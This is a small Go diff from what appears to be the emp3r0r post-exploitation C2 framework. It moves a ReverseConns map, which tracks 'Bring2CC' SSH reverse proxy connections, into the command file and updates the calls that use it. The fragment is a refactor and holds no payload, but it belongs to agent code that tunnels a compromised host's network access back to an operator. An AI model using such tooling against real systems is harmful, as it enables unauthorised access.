@@ -10,6 +10,7 @@ import (
 	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/fxamacker/cbor/v2"
@@ -27,6 +28,10 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
 )
+
+// ReverseConns tracks active Bring2CC reverse proxy connections.
+// Key: target addr string, Value: context.CancelFunc
+var ReverseConns sync.Map
 
 // runListDir implements !ls --path <path>
 func runListDir(cmd *cobra.Command, args []string) {
@@ -130,7 +135,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error: We don't have any internet to share\n")
 		return
 	}
-	modules.ReverseConns.Range(func(p, cancelfunc interface{}) bool {
+	ReverseConns.Range(func(p, cancelfunc interface{}) bool {
 		if addr == p.(string) {
 			cancelfunc.(context.CancelFunc)()
 		}
@@ -172,7 +177,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 			return
 		}
 	}
-	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &modules.ReverseConns, def.ProxyServer, ctx, cancel)
+	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &ReverseConns, def.ProxyServer, ctx, cancel)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "%v\n", err)
 		return
